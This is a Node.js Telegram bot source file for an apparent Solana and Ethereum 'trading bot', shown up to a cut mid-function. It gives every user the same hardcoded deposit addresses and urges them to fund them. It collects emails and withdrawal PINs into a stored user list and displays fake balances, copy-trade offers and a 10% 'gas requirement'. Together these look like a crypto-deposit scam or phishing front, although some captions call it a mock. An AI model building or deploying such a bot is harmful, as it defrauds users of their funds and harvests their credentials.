require("dotenv/config");
const { Telegraf, Markup, Input } = require("telegraf");
const http = require("http");
http.createServer((req, res) => res.end("OK")).listen(process.env.PORT || 8080);

const TOKEN = process.env.HTTP_API_TOKEN || process.env.TELEGRAM_BOT_TOKEN;

if (!TOKEN) {
  console.error("❌ Error: TELEGRAM_BOT_TOKEN is missing in your .env file!");
  process.exit(1);
}

const SOL_PRICE = 152.3;
const ETH_PRICE = 2485.59;
const MOCK_WALLET = "4Fiz4GD19uyVbyQfXfGmmnQm1p9ViQPLTt6itVdDWrzP";

const ADMIN_ID = process.env.ADMIN_ID ? parseInt(process.env.ADMIN_ID) : null;
const MOCK_ETH_ADDRESS = "0x2f769C7250ef361E9468291eBcCE39E331047ab7";

const MOCK_TRADERS = [
  {
    id: "trader1",
    name: "@alpha_trader",
    avatar: "🟣",
    trade: { action: "BUY", token: "SOL", amount: 500, entry: 152.3, target: 165, stopLoss: 145 },
    timeframe: "24h",
  },
  {
    id: "trader2",
    name: "@beta_sniper",
    avatar: "🔵",
    trade: { action: "SELL", token: "ETH", amount: 1200, entry: 3500, target: 3800, stopLoss: 3300 },
    timeframe: "12h",
  },
  {
    id: "trader3",
    name: "@gamma_bonk",
    avatar: "🟢",
    trade: { action: "BUY", token: "BONK", amount: 800, entry: 0.0000085, target: 0.00001, stopLoss: 0.000007 },
    timeframe: "5m",
  },
  {
    id: "trader4",
    name: "@delta_wif",
    avatar: "🔴",
    trade: { action: "BUY", token: "WIF", amount: 450, entry: 2.1, target: 2.8, stopLoss: 1.8 },
    timeframe: "3h",
  },
  {
    id: "trader5",
    name: "@epsilon_jup",
    avatar: "🟡",
    trade: { action: "BUY", token: "JUP", amount: 600, entry: 0.65, target: 0.85, stopLoss: 0.55 },
    timeframe: "1h",
  },
];

const MEDIA_PATHS = {
  welcome: "./src/images1.mp4",
  network: "./src/photo_3.jpg",
  wallet: "./src/photo_4.jpg",
  security: "./src/images1.mp4",
  email: "./src/photo_3.jpg",
  pin: "./src/photo_4.jpg",
  dashboard: "./src/images1.mp4",
  buy: "./src/photo_3.jpg",
  sell: "./src/photo_3.jpg",
  balance: "./src/photo_4.jpg",
  portfolio: "./src/photo_4.jpg",
  deposit: "./src/photo_4.jpg",
  swap: "./src/photo_3.jpg",
  withdraw: "./src/photo_3.jpg",
  stake: "./src/photo_4.jpg",
  copy: "./src/images1.mp4",
  dca: "./src/images1.mp4",
  alerts: "./src/images1.mp4",
  settings: "./src/photo_4.jpg",
  main: "./src/photo_4.jpg",
  signal: "./src/photo_3.jpg",
};

const mediaCache = new Map();

function mediaFor(ctx, key) {
  const chatId = ctx?.chat?.id ?? 0;
  const cached = mediaCache.get(chatId)?.get(key);
  return cached ?? Input.fromLocalFile(MEDIA_PATHS[key]);
}

function mediaForChat(chatId, key) {
  const cached = mediaCache.get(chatId)?.get(key);
  return cached ?? Input.fromLocalFile(MEDIA_PATHS[key]);
}

function captureFileId(chatId, key, msg) {
  if (!msg) return;
  const fileId = msg?.photo?.[0]?.file_id || msg?.animation?.file_id || msg?.video?.file_id;
  if (fileId) {
    if (!mediaCache.has(chatId)) mediaCache.set(chatId, new Map());
    mediaCache.get(chatId).set(key, fileId);
  }
}

async function replyWithCachedPhoto(ctx, key, extra) {
  const res = await ctx.replyWithPhoto(mediaFor(ctx, key), extra);
  captureFileId(ctx?.chat?.id ?? 0, key, res);
  return res;
}

async function sendPhotoCached(chatId, key, extra) {
  const res = await bot.telegram.sendPhoto(chatId, mediaForChat(chatId, key), extra);
  captureFileId(chatId, key, res);
  return res;
}

async function deleteUserMessage(ctx) {
  try {
    const msgId = ctx?.message?.message_id;
    if (msgId !== undefined) {
      await ctx.deleteMessage(msgId);
    }
  } catch (e) {
  }
}

function defaultState() {
  return {
    userId: null,
    username: null,
    address: MOCK_WALLET,
    awaitingEmail: false,
    awaitingPin: false,
    awaitingPinConfirm: false,
    awaitingSwapAmount: false,
    swapPair: null,
    awaitingWithdrawAmount: false,
    withdrawToken: null,
    awaitingStakeAmount: false,
    stakeToken: null,
     currentView: null,
     pendingAction: null,
     selectedTrader: null,
     buyToken: null,
     sellToken: null,
solBalance: 0,
     ethBalance: 0,
     usdcBalance: 0,
    alerts: true,
    slippage: false,
    autoBuy: false,
    mevProtection: false,
    positions: [
      {
        mint: "So11111111111111111111111111111111111111113",
        symbol: "SOL",
        amount: 1.2,
        entryPrice: 148.5,
        currentPrice: 152.3,
      },
    ],
  };
}

const sessions = new Map();
const registeredUsers = new Map();

function getState(ctx) {
  const chatId = ctx?.chat?.id ?? 0;
  let state = sessions.get(chatId);
  if (!state) {
    state = defaultState();
    if (ctx?.from?.id) state.userId = ctx.from.id;
    if (ctx?.from?.username) state.username = ctx.from.username;
    sessions.set(chatId, state);
  }
  return state;
}

function registerUser(state) {
  if (state.userId && state.email && state.pin) {
    registeredUsers.set(state.userId, {
      userId: state.userId,
      username: state.username,
      email: state.email,
      pin: state.pin,
      address: state.address,
      solBalance: state.solBalance,
      ethBalance: state.ethBalance,
      usdcBalance: state.usdcBalance,
      registeredAt: new Date().toISOString(),
    });
  }
}

const WELCOME_TEXT =
  "🎯 **WELCOME TO THE SOLANA CHALLENGE**\n\n" +
  "Introducing a next-generation trading bot built specifically for Solana traders.\n\n" +
  "⚡ **Instant Token Access** — Trade eligible Solana tokens immediately after launch.\n" +
  "🤖 **Automated Copy Trading** — Automatically replicate configured trading strategies.\n" +
  "🔐 **Secure Wallet Connection** — Connect your wallet without sharing your private keys or seed phrase.\n" +
  "📊 **Real-Time Execution** — Designed for fast execution in the rapidly moving Solana market.\n\n" +
  "You can either **generate a new wallet** or **import an existing one** to get started.\n\n" +
  "Select an option below:";

const NETWORK_TEXT =
  "🌐 **Select Network**\n\nChoose the network for this wallet:";

function walletAssignedText(state) {
  return (
    "✅ **Solana Wallet Assigned!**\n\n" +
    "🟣 **Solana**\n" +
    "`" + state.address + "`" +
    "\n_(Tap to Copy)_\n\n" +
    "Fund this wallet to start trading."
  );
}

const SECURITY_SETUP_TEXT =
  "🔐 **Security Setup**\n\nPlease enter your email address for account security.";

const PIN_PROMPT_TEXT =
  "🔐 **Now set your 4-digit PIN for withdrawals.**\n\n" +
  "_Enter a 4-digit number (message will be auto-deleted for security):_";

const PIN_CONFIRM_TEXT =
  "🔐 **Confirm your PIN by typing it again:**\n\n_(Auto-deleted after you send)_";

const SECURITY_COMPLETE_TEXT = (state) =>
  "✅ **Security Setup Complete!**\n\n" +
  `📧 ${state.email ? state.email.replace(/^(.).(?<=.).*@/, "$1****@") : "****"}\n` +
  "🔐 PIN: ****\n\n" +
  "Your PIN will be required for all withdrawals.";

const TRADE_APP_TEXT = "🚀 *Solana Trade App*";

const NETWORK_GRID_TEXT = (state) =>
  `${TRADE_APP_TEXT}\n\n` +
  "🇸 Solana\n" +
  `${state.address}\n` +
  "Balance: $0.00 (≈ 0 SOL)\n\n" +
  "🇪 Ethereum\n" +
  MOCK_ETH_ADDRESS + "\n" +
  "Balance: $0.00 (≈ 0 ETH)\n\n" +
  `📧 ${state.email ? state.email.replace(/^(.).(?<=.).*@/, "$1****@") : "****"}\n` +
  "🔐 PIN: ****\n\n" +
  "Use the menu below to get started.";

const DASHBOARD_TEXT =
  "🎛️ **Solana Trading Panel Active**\n" +
  "Select an option from the menu below to manage your operations:";

const PIN_MISMATCH_TEXT =
  "❌ **PINs do not match.**\n\n" +
  "🔐 **Now set your 4-digit PIN for withdrawals.**\n\n" +
  "_Enter a 4-digit number (message will be auto-deleted for security):_";

function welcomeKeyboard() {
  return Markup.keyboard([
    [Markup.button.text("✨ Generate Wallet")],
    [Markup.button.text("📥 Import Wallet")],
  ]).resize();
}

function networkKeyboard() {
  return Markup.keyboard([
    [Markup.button.text("🟣 Solana"), Markup.button.text("🔵 Ethereum")],
  ]).resize();
}

function dashboardKeyboard() {
  return Markup.keyboard([
    ["🏠 Main Menu", "💰 Buy", "📉 Sell"],
    ["🔄 Swap", "💸 Withdraw", "💎 Stake"],
    ["👥 Copy Trade", "💳 Balance", "💳 Deposit"],
    ["📊 DCA", "🔔 Alerts", "📊 Signal Strength"],
    ["📈 Portfolio", "🧾 Trades", "📜 History"],
    ["👥 Referral", "🎟️ Support"],
  ]).resize();
}

function buyKeyboard() {
  return Markup.keyboard([
    ["0.1 SOL", "0.5 SOL", "1.0 SOL"],
    ["✏️ Custom Amount"],
    ["🔙 Back"],
  ]).resize();
}

function buyTokenKeyboard() {
  return Markup.keyboard([
    ["sol", "eth"],
    ["🔙 Back"],
  ]).resize();
}

function sellKeyboard() {
  return Markup.keyboard([
    ["25%", "50%", "🔥 100%"],
    ["✏️ Custom Amount"],
    ["🔙 Back"],
  ]).resize();
}

function sellTokenKeyboard() {
  return Markup.keyboard([
    ["sol", "eth"],
    ["🔙 Back"],
  ]).resize();
}

function settingsKeyboard(state) {
  return Markup.keyboard([
    [`Slippage: ${state.slippage ? "ON ✅" : "OFF ❌"}`, `Auto-buy: ${state.autoBuy ? "ON ✅" : "OFF ❌"}`],
    [`MEV Protection: ${state.mevProtection ? "ON ✅" : "OFF ❌"}`],
    ["🔙 Back", "🏠 Dashboard"],
  ]).resize();
}

function mainMenuKeyboard() {
  return Markup.keyboard([
    ["⚙️ Settings"],
    ["🔁 Restart"],
    ["🏠 Back to Dashboard"],
  ]).resize();
}

function backKeyboard() {
  return Markup.keyboard([
    ["🔙 Back"],
  ]).resize();
}

function securityCompleteKeyboard() {
  return Markup.keyboard([
    ["🚀 Enter Dashboard"],
  ]).resize();
}

function swapPairKeyboard() {
  return Markup.keyboard([
    ["SOL → ETH", "ETH → SOL"],
    ["🔙 Back"],
  ]).resize();
}

function withdrawTokenKeyboard() {
  return Markup.keyboard([
    ["sol", "eth"],
    ["🔙 Back"],
  ]).resize();
}

function stakeTokenKeyboard() {
  return Markup.keyboard([
    ["sol", "eth"],
    ["🔙 Back"],
  ]).resize();
}

function dcaKeyboard() {
  return Markup.keyboard([
    ["New DCA"],
    ["My DCA plans"],
    ["🔙 Back"],
  ]).resize();
}

function copyTradersKeyboard() {
  const rows = MOCK_TRADERS.map((t) => [`${t.avatar} ${t.name}`]);
  rows.push(["🔙 Back"]);
  return Markup.keyboard(rows).resize();
}

function copyTradeKeyboard(traderId) {
  return Markup.keyboard([
    ["📋 Copy This Trade"],
    ["🔙 Back"],
  ]).resize();
}

const bot = new Telegraf(TOKEN);

async function handleStepNetwork(ctx, state) {
  state.awaitingEmail = false;
  state.awaitingPin = false;
  state.awaitingPinConfirm = false;
  state.currentView = "network";
  return replyWithCachedPhoto(ctx, "network", {
    caption: NETWORK_TEXT,
    parse_mode: "Markdown",
    reply_markup: networkKeyboard().reply_markup,
  });
}

async function handleStepAssigned(ctx, state) {
  state.currentView = "wallet_assigned";
  await replyWithCachedPhoto(ctx, "wallet", {
    caption: walletAssignedText(state),
    parse_mode: "Markdown",
  });
  const chatId = ctx?.chat?.id;
  setTimeout(() => {
    state.awaitingEmail = true;
    if (chatId !== undefined) {
      sendPhotoCached(chatId, "security", {
        caption: SECURITY_SETUP_TEXT,
        parse_mode: "Markdown",
        reply_markup: { remove_keyboard: true },
      });
    }
  }, 1500);
}

async function handleMenuDashboard(ctx, state) {
  state.currentView = "dashboard";
  state.pendingAction = null;
  state.selectedTrader = null;
  return replyWithCachedPhoto(ctx, "dashboard", {
    caption: NETWORK_GRID_TEXT(state),
    parse_mode: "Markdown",
    reply_markup: dashboardKeyboard().reply_markup,
  });
}

async function handleDashMain(ctx, state) {
  state.currentView = "main_menu";
  return replyWithCachedPhoto(ctx, "main", {
    caption: "🏠 **Main Menu**\n\nAccount & trading options:",
    parse_mode: "Markdown",
    reply_markup: mainMenuKeyboard().reply_markup,
  });
}

async function handleMenuSettings(ctx, state) {
  state.currentView = "settings";
  return replyWithCachedPhoto(ctx, "settings", {
    caption:
      "⚙️ *Settings*\n\n" +
      "Toggle trading options below:\n\n" +
      `• *Slippage* — ${state.slippage ? "ON ✅" : "OFF ❌"}\n` +
      `• *Auto-buy* — ${state.autoBuy ? "ON ✅" : "OFF ❌"}\n` +
      `• *MEV Protection* — ${state.mevProtection ? "ON ✅" : "OFF ❌"}\n`,
    parse_mode: "Markdown",
    reply_markup: settingsKeyboard(state).reply_markup,
  });
}

async function handleDashBuy(ctx, state) {
  state.currentView = "buy";
  state.pendingAction = "buy";
  state.buyToken = null;
  const solUsd = state.solBalance * SOL_PRICE;
  const ethUsd = state.ethBalance * ETH_PRICE;
  return replyWithCachedPhoto(ctx, "buy", {
    caption:
      "💰 *Buy Tokens*\n\n" +
      `🟣 SOL: $${solUsd.toFixed(2)}\n` +
      `🔵 ETH: $${ethUsd.toFixed(2)}\n\n` +
      "Select token:",
    parse_mode: "Markdown",
    reply_markup: buyTokenKeyboard().reply_markup,
  });
}

async function handleBuyToken(ctx, state, token) {
  state.currentView = "buy_" + token;
  state.buyToken = token;
  state.pendingAction = "buy";
  const price = token === "eth" ? ETH_PRICE : SOL_PRICE;
  const balance = token === "eth" ? state.ethBalance : state.solBalance;
  const currency = token === "eth" ? "ETH" : "SOL";
  return replyWithCachedPhoto(ctx, "buy", {
    caption:
      `💰 *Buy ${currency}*\n\n` +
      `🟣 Price: $${price.toFixed(2)}\n\n` +
      "Enter amount in USD:",
    parse_mode: "Markdown",
    reply_markup: backKeyboard().reply_markup,
  });
}

async function handleDashSell(ctx, state) {
  state.currentView = "sell";
  state.pendingAction = "sell";
  state.sellToken = null;
  const solUsd = state.solBalance * SOL_PRICE;
  const ethUsd = state.ethBalance * ETH_PRICE;
  return replyWithCachedPhoto(ctx, "sell", {
    caption:
      "📉 *Sell Tokens*\n\n" +
      `🟣 SOL: $${solUsd.toFixed(2)}\n` +
      `🔵 ETH: $${ethUsd.toFixed(2)}\n\n` +
      "Select token:",
    parse_mode: "Markdown",
    reply_markup: sellTokenKeyboard().reply_markup,
  });
}

async function handleSellToken(ctx, state, token) {
  state.currentView = "sell_" + token;
  state.sellToken = token;
  state.pendingAction = "sell";
  const price = token === "eth" ? ETH_PRICE : SOL_PRICE;
  const currency = token === "eth" ? "ETH" : "SOL";
  const balance = token === "eth" ? state.ethBalance : state.solBalance;
  return replyWithCachedPhoto(ctx, "sell", {
    caption:
      `📉 *Sell ${currency}*\n\n` +
      `🟣 Holdings: ${balance.toFixed(4)} ${currency}\n` +
      "Select a percentage to sell, or enter a custom amount.\n\n" +
      `Price: $${price.toFixed(2)} / ${currency}`,
    parse_mode: "Markdown",
    reply_markup: sellKeyboard().reply_markup,
  });
}

async function handleBuyAmount(ctx, state, amount) {
  const usd = parseFloat(amount);
  const token = state.buyToken;
  const price = token === "eth" ? ETH_PRICE : SOL_PRICE;
  const currency = token === "eth" ? "ETH" : "SOL";
  const balanceUsd = token === "eth" ? state.ethBalance * ETH_PRICE : state.solBalance * SOL_PRICE;
  const solUsd = state.solBalance * SOL_PRICE;
  const ethUsd = state.ethBalance * ETH_PRICE;

  if (usd > balanceUsd) {
    return replyWithCachedPhoto(ctx, "buy", {
      caption:
        "❌ *Insufficient balance.*\n\n" +
        "💵 Total available: $0.00\n" +
        "   • SOL: $" + solUsd.toFixed(2) + "\n" +
        "   • ETH: $" + ethUsd.toFixed(2) + "\n" +
        `💵 Required: $${usd.toFixed(2)}\n\n` +
        "Please enter a lower amount.",
      parse_mode: "Markdown",
      reply_markup: backKeyboard().reply_markup,
    });
  }

  const bought = usd / price;
  if (token === "eth") {
    state.ethBalance += bought;
  } else {
    state.solBalance += bought;
  }
  return replyWithCachedPhoto(ctx, "buy", {
    caption:
      "🟢 *Buy Order (Mock)*\n\n" +
      `💵 Purchased: $${usd.toFixed(2)} ${currency}\n` +
      `💰 Received: ${bought.toFixed(6)} ${currency}\n` +
      `Price: $${price.toFixed(2)} / ${currency}\n\n` +
      "✅ *Order executed (simulated)*\n" +
      (token === "eth"
        ? `New ETH balance: ${state.ethBalance.toFixed(6)} ETH\n`
        : `New SOL balance: ${state.solBalance.toFixed(4)} SOL`),
    parse_mode: "Markdown",
    reply_markup: backKeyboard().reply_markup,
  });
}

async function handleSellPct(ctx, state, pctStr) {
  const pct = parseInt(pctStr, 10);
  const token = state.sellToken;
  const price = token === "eth" ? ETH_PRICE : SOL_PRICE;
  const currency = token === "eth" ? "ETH" : "SOL";
  const balance = token === "eth" ? state.ethBalance : state.solBalance;
  const sellAmount = (balance * pct) / 100;
  const proceeds = sellAmount * price;

  if (sellAmount <= 0) {
    const solUsd = state.solBalance * SOL_PRICE;
    const ethUsd = state.ethBalance * ETH_PRICE;
    return replyWithCachedPhoto(ctx, "sell", {
      caption:
        "❌ *Insufficient balance.*\n\n" +
        "💵 Total available: $0.00\n" +
        "   • SOL: $" + solUsd.toFixed(2) + "\n" +
        "   • ETH: $" + ethUsd.toFixed(2) + "\n" +
        `💵 Required: $${proceeds.toFixed(2)}\n\n` +
        "Please enter a lower amount.",
      parse_mode: "Markdown",
      reply_markup: backKeyboard().reply_markup,
    });
  }

  if (token === "eth") {
    state.ethBalance -= sellAmount;
  } else {
    state.solBalance -= sellAmount;
  }
  state.usdcBalance += proceeds;
  return replyWithCachedPhoto(ctx, "sell", {
    caption:
      "🔴 *Sell Order (Mock)*\n\n" +
      `📉 Selling: ${pct}% of ${balance.toFixed(4)} ${currency}\n` +
      `💰 Amount: ${sellAmount.toFixed(6)} ${currency}\n` +
      `💵 Proceeds: ~$${proceeds.toFixed(2)} USDC\n` +
      `Price: $${price.toFixed(2)} / ${currency}\n\n` +
      "✅ *Order executed (simulated)*\n" +
      (token === "eth"
        ? `💎 Remaining ETH balance: ${state.ethBalance.toFixed(6)} ETH`
        : `💎 Remaining SOL balance: ${state.solBalance.toFixed(4)} SOL`),
    parse_mode: "Markdown",
    reply_markup: backKeyboard().reply_markup,
  });
}

async function handleDashBalance(ctx, state) {
  state.currentView = "balance";
  const solUsd = state.solBalance * SOL_PRICE;
  const total = solUsd + state.usdcBalance;
  return replyWithCachedPhoto(ctx, "balance", {
    caption:
      "💳 *Balance*\n\n" +
      `🟣 SOL: $${solUsd.toFixed(2)} (≈ ${state.solBalance.toFixed(4)} SOL)\n` +
      "🔵 ETH: $0.00 (≈ 0 ETH)\n\n" +
      `💎 Total: $${total.toFixed(2)}`,
    parse_mode: "Markdown",
    reply_markup: backKeyboard().reply_markup,
  });
}

async function handleDashPortfolio(ctx, state) {
  state.currentView = "portfolio";
  const solValue = state.solBalance * SOL_PRICE;
  const total = solValue + state.usdcBalance;
  return replyWithCachedPhoto(ctx, "portfolio", {
    caption:
      "📈 *Portfolio*\n\n" +
      `🟣 SOL — $${solValue.toFixed(2)} (≈ ${state.solBalance.toFixed(4)} SOL)\n` +
      "🔵 ETH — $0.00 (≈ 0 ETH)\n" +
      `💎 Total: $${total.toFixed(2)}\n`,
    parse_mode: "Markdown",
    reply_markup: backKeyboard().reply_markup,
  });
}

async function handleDashDeposit(ctx, state) {
  state.currentView = "deposit";
  return replyWithCachedPhoto(ctx, "deposit", {
    caption:
      "💳 *Deposit*\n\n" +
      "Send funds to the addresses below.\n\n" +
      "🟣 SOL\n" +
      `\`${state.address}\`\n` +
      "_(Tap to Copy)_\n\n" +
      "🔵 ETH\n" +
      MOCK_ETH_ADDRESS + "\n" +
      "_(Tap to Copy)_",
    parse_mode: "Markdown",
    reply_markup: backKeyboard().reply_markup,
  });
}

async function handleDashSwap(ctx, state) {
  state.currentView = "swap";
  return replyWithCachedPhoto(ctx, "swap", {
    caption:
      "🔄 *Swap*\n\n" +
      "Select pair:\n\n" +
      "SOL → ETH\n" +
      "ETH → SOL",
    parse_mode: "Markdown",
    reply_markup: swapPairKeyboard().reply_markup,
  });
}

async function handleSwapPair(ctx, state, pair) {
  state.currentView = "swap_" + pair;
  state.swapPair = pair;
  state.awaitingSwapAmount = true;
  const solUsd = state.solBalance * SOL_PRICE;
  if (pair === "sol-eth") {
    const gasEth = solUsd * 0.10;
    return replyWithCachedPhoto(ctx, "swap", {
      caption:
        "🔄 *Swap SOL → ETH*\n\n" +
        `💵 Your SOL balance: $${solUsd.toFixed(2)}\n` +
        `⛽️ Gas requirement: $${gasEth.toFixed(2)} in ETH (10% of your SOL balance)\n` +
        "💵 Your ETH balance: $0.00\n\n" +
        "✅ Gas requirement met\n\n" +
        "Enter amount in USD:",
      parse_mode: "Markdown",
      reply_markup: backKeyboard().reply_markup,
    });
  }
  const ethUsd = 0;
  const gasSol = ethUsd * 0.10;
  return replyWithCachedPhoto(ctx, "swap", {
    caption:
      "🔄 *Swap ETH → SOL*\n\n" +
      `💵 Your ETH balance: $${ethUsd.toFixed(2)}\n` +
      `⛽️ Gas requirement: $${gasSol.toFixed(2)} in SOL (10% of your ETH balance)\n` +
      `💵 Your SOL balance: $${solUsd.toFixed(2)}\n\n` +
      "✅ Gas requirement met\n\n" +
      "Enter amount in USD:",
    parse_mode: "Markdown",
    reply_markup: backKeyboard().reply_markup,
  });
}

async function handleDashWithdraw(ctx, state) {
  state.currentView = "withdraw";
  state.pendingAction = "withdraw";
  return replyWithCachedPhoto(ctx, "withdraw", {
    caption:
      "💸 *Withdraw*\n\n" +
      "Select token:\n\n" +
      "sol\n" +
      "eth",
    parse_mode: "Markdown",
    reply_markup: withdrawTokenKeyboard().reply_markup,
  });
}

async function handleWithdrawToken(ctx, state, token) {
  state.currentView = "withdraw_" + token;
  state.withdrawToken = token;
  state.awaitingWithdrawAmount = true;
  const ethUsd = 0;
  if (token === "sol") {
    const solUsd = state.solBalance * SOL_PRICE;
    return replyWithCachedPhoto(ctx, "withdraw", {
      caption:
        "💸 *Withdraw SOL*\n\n" +
        `💵 Your SOL balance: $${solUsd.toFixed(2)} (${state.solBalance.toFixed(4)} SOL)\n\n` +
        "Enter amount in USD:",
      parse_mode: "Markdown",
      reply_markup: backKeyboard().reply_markup,
    });
  }
  return replyWithCachedPhoto(ctx, "withdraw", {
    caption:
      "💸 *Withdraw ETH*\n\n" +
      `💵 Your ETH balance: $${ethUsd.toFixed(2)} (0.0000 ETH)\n\n` +
      "Enter amount in USD:",
    parse_mode: "Markdown",
    reply_markup: backKeyboard().reply_markup,
  });
}

async function handleDashStake(ctx, state) {
  state.currentView = "staking";
  state.pendingAction = "stake";
  return replyWithCachedPhoto(ctx, "stake", {
    caption:
      "📊 *Staking*\n\n" +
      "🟣 SOL 5.5% APY\n" +
      "🔵 ETH 4.2% APY\n\n" +
      "Select token:\n\n" +
      "sol\n" +
      "eth",
    parse_mode: "Markdown",
    reply_markup: stakeTokenKeyboard().reply_markup,
  });
}

async function handleStakeToken(ctx, state, token) {
  state.currentView = "stake_" + token;
  state.stakeToken = token;
  state.awaitingStakeAmount = true;
  const ethUsd = 0;
  if (token === "sol") {
    const solUsd = state.solBalance * SOL_PRICE;
    return replyWithCachedPhoto(ctx, "stake", {
      caption:
        "💎 *Stake SOL*\n\n" +
        `💵 Your SOL balance: $${solUsd.toFixed(2)} (${state.solBalance.toFixed(4)} SOL)\n\n` +
        "Enter amount in USD:",
      parse_mode: "Markdown",
      reply_markup: backKeyboard().reply_markup,
    });
  }
  return replyWithCachedPhoto(ctx, "stake", {
    caption:
      "💎 *Stake ETH*\n\n" +
      `💵 Your ETH balance: $${ethUsd.toFixed(2)} (0.0000 ETH)\n\n` +
      "Enter amount in USD:",
    parse_mode: "Markdown",
    reply_markup: backKeyboard().reply_markup,
  });
}

async function handleDashCopy(ctx, state) {
  state.currentView = "copy_trade";
  const tradersText = MOCK_TRADERS.map((t, i) =>
    `${i + 1}. ${t.avatar} ${t.name} — ${t.trade.token} ${t.trade.action === "BUY" ? "↑" : "↓"} ${t.timeframe}`
  ).join("\n");
  return replyWithCachedPhoto(ctx, "copy", {
    caption:
      "👥 *Copy Trading*\n\n" +
      "Follow traders and mirror their trades:\n\n" +
      tradersText +
      "\n\nSelect a trader to copy:",
    parse_mode: "Markdown",
    reply_markup: copyTradersKeyboard().reply_markup,
  });
}

async function handleCopyTrader(ctx, state, traderId) {
  const trader = MOCK_TRADERS.find((t) => t.id === traderId);
  if (!trader) return;
  state.currentView = "trader_detail";
  state.selectedTrader = traderId;
  return replyWithCachedPhoto(ctx, "copy", {
    caption:
      `👥 *${trader.name}*\n\n` +
      "📊 *Trade: " + trader.trade.action + " " + trader.trade.token + "*\n" +
      `💰 Amount: $${trader.trade.amount.toFixed(2)}\n` +
      `⚡ Entry: $${trader.trade.entry.toFixed(4)}\n` +
      `🎯 Target: $${trader.trade.target.toFixed(2)}\n` +
      `🛑 Stop Loss: $${trader.trade.stopLoss.toFixed(2)}\n\n` +
      `_Timeframe: ${trader.timeframe}_`,
    parse_mode: "Markdown",
    reply_markup: copyTradeKeyboard(trader.id).reply_markup,
  });
}

async function handleCopyConfirm(ctx, state, traderId) {
  const trader = MOCK_TRADERS.find((t) => t.id === traderId);
  if (!trader) return;
  state.currentView = "copy_confirm";
  return replyWithCachedPhoto(ctx, "copy", {
    caption:
      "✅ *Trade Copied!*\n\n" +
      `📊 *Copied: ${trader.trade.action} ${trader.trade.token}*\n` +
      `💰 Amount: $${trader.trade.amount.toFixed(2)}\n` +
      `⚡ Entry: $${trader.trade.entry.toFixed(4)}\n` +
      `🎯 Target: $${trader.trade.target.toFixed(2)}\n` +
      `🛑 Stop Loss: $${trader.trade.stopLoss.toFixed(2)}\n\n` +
      `_You are now copying ${trader.name}'s trade._\n\n` +
      "_Copy trading is simulated in this mock._",
    parse_mode: "Markdown",
    reply_markup: backKeyboard().reply_markup,
  });
}

async function handleDashDca(ctx, state) {
  state.currentView = "dca";
  return replyWithCachedPhoto(ctx, "dca", {
    caption:
      "📊 *DCA*\n\n" +
      "Select an option:\n\n" +
       "New DCA\n" +
      "My DCA plans",
    parse_mode: "Markdown",
    reply_markup: dcaKeyboard().reply_markup,
  });
}

async function handleDcaNew(ctx, state) {
  state.currentView = "dca_new";
  const solUsd = state.solBalance * SOL_PRICE;
  return replyWithCachedPhoto(ctx, "dca", {
    caption:
      "📊 *New DCA*\n\n" +
      "Step 1/3: Enter amount in USD\n\n" +
      "💳 DCA will debit from: 🟣 Solana (SOL)\n" +
      `💵 Available: $${solUsd.toFixed(2)}`,
    parse_mode: "Markdown",
    reply_markup: backKeyboard().reply_markup,
  });
}

async function handleDcaPlans(ctx, state) {
  state.currentView = "dca_plans";
  return replyWithCachedPhoto(ctx, "dca", {
    caption: "📋 *My DCA Plans*\n\nNo active plans.",
    parse_mode: "Markdown",
    reply_markup: backKeyboard().reply_markup,
  });
}

async function handleDashAlerts(ctx, state) {
  state.currentView = "alerts";
  return replyWithCachedPhoto(ctx, "alerts", {
    caption:
      `🔔 *Notifications ${state.alerts ? "ON" : "OFF"}*\n\n` +
      `Tap the button below to ${state.alerts ? "turn OFF" : "turn ON"} notifications.`,
    parse_mode: "Markdown",
    reply_markup: alertsKeyboard(state).reply_markup,
  });
}

function alertsKeyboard(state) {
  return Markup.keyboard([
    [state.alerts ? "🔔 Notifications ON" : "🔕 Notifications OFF"],
    ["🔙 Back"],
  ]).resize();
}

async function handleDashSignal(ctx, state) {
  state.currentView = "signal";
  return replyWithCachedPhoto(ctx, "signal", {
    caption:
      "📊 *Signal Strength*\n\n" +
      "🔴 Status: LOW\n\n" +
      "░░░░░░░░░░░░░░░░░░░░\n" +
      "0.00\n\n" +
      "_Last updated: 11:01:15_",
    parse_mode: "Markdown",
    reply_markup: backKeyboard().reply_markup,
  });
}

async function handleDashTrades(ctx, state) {
  state.currentView = "trades";
  return replyWithCachedPhoto(ctx, "main", {
    caption: "📜 *Trades*\n\nNo recent trades.",
    parse_mode: "Markdown",
    reply_markup: backKeyboard().reply_markup,
  });
}

async function handleDashHistory(ctx, state) {
  state.currentView = "history";
  return replyWithCachedPhoto(ctx, "main", {
    caption: "📋 *Withdrawal History*\n\nNo withdrawals yet.",
    parse_mode: "Markdown",
    reply_markup: backKeyboard().reply_markup,
  });
}

async function handleDashReferral(ctx, state) {
  state.currentView = "referral";
  return replyWithCachedPhoto(ctx, "main", {
    caption:
      "👥 *Referral*\n\n" +
      "🔑 Your code: 8c6615f0\n\n" +
      "💎 Tier 1: 35%\n" +
      "💎 Tier 2: 25%",
    parse_mode: "Markdown",
    reply_markup: backKeyboard().reply_markup,
  });
}

async function handleDashSupport(ctx, state) {
  state.currentView = "support";
  return replyWithCachedPhoto(ctx, "main", {
    caption:
      "🎟️ Support\n\n" +
      "📱 Telegram: @tradebots_support",
    reply_markup: backKeyboard().reply_markup,
  });
}

async function handleMenuReset(ctx, state) {
  state.email = undefined;
  state.pin = undefined;
  state.awaitingEmail = false;
  state.awaitingPin = false;
  state.awaitingPinConfirm = false;
  state.awaitingSwapAmount = false;
  state.swapPair = null;
  state.awaitingWithdrawAmount = false;
  state.withdrawToken = null;
  state.awaitingStakeAmount = false;
  state.stakeToken = null;
  state.currentView = null;
  state.pendingAction = null;
  state.selectedTrader = null;
  state.solBalance = 0;
  state.ethBalance = 0;
  state.usdcBalance = 0;
  state.alerts = true;
  state.slippage = false;
  state.autoBuy = false;
  state.mevProtection = false;
  return replyWithCachedPhoto(ctx, "welcome", {
    caption: WELCOME_TEXT,
    parse_mode: "Markdown",
    reply_markup: welcomeKeyboard().reply_markup,
  });
}

async function handleAlertsToggle(ctx, state) {
  state.alerts = !state.alerts;
  state.currentView = "alerts";
  return replyWithCachedPhoto(ctx, "alerts", {
    caption:
      `🔔 *Notifications ${state.alerts ? "ON" : "OFF"}*\n\n` +
      `Tap the button below to ${state.alerts ? "turn OFF" : "turn ON"} notifications.`,
    parse_mode: "Markdown",
    reply_markup: alertsKeyboard(state).reply_markup,
  });
}

function dispatchNav(text, state) {
  if (text === "✨ Generate Wallet" || text === "📥 Import Wallet") return (ctx) => handleStepNetwork(ctx, state);
